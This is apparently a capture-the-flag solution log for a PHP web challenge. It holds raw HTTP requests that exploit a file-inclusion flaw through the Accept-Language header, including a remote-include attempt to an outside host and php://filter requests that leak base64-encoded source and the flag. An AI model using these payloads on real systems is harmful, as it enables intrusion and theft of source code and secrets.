@@ -1,0 +1,40 @@
+GET /?page=ctf HTTP/1.1
+Host: globalpage.chal.ctf.westerns.tokyo
+Accept-Language: ../ctf/cs
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+--
+GET /?page=http: HTTP/1.1
+Host: globalpage.chal.ctf.westerns.tokyo
+Accept-Language: //8.8.8.8:1337/test
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+:  include(): http:// wrapper is disabled in the server configuration by allow_url_include=0 in 
+--
+GET /?page=php: HTTP/1.1
+Host: globalpage.chal.ctf.westerns.tokyo
+Accept-Language: /filter/convert.base64-encode/resource=index
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+PD9waHAKaWYgKCFkZWZpbmVkKCdJTkNMVURFRF9JTkRFWCcpKSB7CmRlZmluZSgnSU5DTFVERURfSU5ERVgnLCB0cnVlKTsKaW5pX3NldCgnZGlzcGxheV9lcnJvcnMnLCAxKTsKaW5jbHVkZSAiZmxhZy5waHAiOwo/Pgo8IWRvY3R5cGUgaHRtbD4KPGh0bWw+CjxoZWFkPgo8bWV0YSBjaGFyc2V0PXV0Zi04Pgo8dGl0bGU+R2xvYmFsIFBhZ2U8L3RpdGxlPgo8c3R5bGU+Ci5ydGwgewogIGRpcmVjdGlvbjogcnRsOwp9Cjwvc3R5bGU+CjwvaGVhZD4KCjxib2R5Pgo8P3BocAokZGlyID0gIiI7CmlmKGlzc2V0KCRfR0VUWydwYWdlJ10pKSB7CgkkZGlyID0gc3RyX3JlcGxhY2UoWycuJywgJy8nXSwgJycsICRfR0VUWydwYWdlJ10pOwp9CgppZihlbXB0eSgkZGlyKSkgewo/Pgo8dWw+Cgk8bGk+PGEgaHJlZj0iLz9wYWdlPXRva3lvIj5Ub2t5bzwvYT48L2xpPgoJPGxpPjxkZWw+V2VzdGVybnM8L2RlbD48L2xpPgoJPGxpPjxhIGhyZWY9Ii8/cGFnZT1jdGYiPkNURjwvYT48L2xpPgo8L3VsPgo8P3BocAp9CmVsc2UgewoJZm9yZWFjaChleHBsb2RlKCIsIiwgJF9TRVJWRVJbJ0hUVFBfQUNDRVBUX0xBTkdVQUdFJ10pIGFzICRsYW5nKSB7CgkJJGwgPSB0cmltKGV4cGxvZGUoIjsiLCAkbGFuZylbMF0pOwo/Pgo8cDw/PSgkbD09PSdoZScpPyIgY2xhc3M9cnRsIjoiIj8+Pgo8P3BocAoJCWluY2x1ZGUgIiRkaXIvJGwucGhwIjsKPz4KPC9wPgo8P3BocAoJfQp9Cj8+CjwvYm9keT4KPC9odG1sPgo8P3BocAp9Cj8+Cg==
+--
+GET /?page=php: HTTP/1.1
+Host: globalpage.chal.ctf.westerns.tokyo
+Accept-Language: /filter/convert.base64-encode/resource=flag
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+PD9waHAKJGZsYWcgPSAiVFdDVEZ7SV9mb3VuZF9zaW1wbGVfTEZJfSI7Cg==
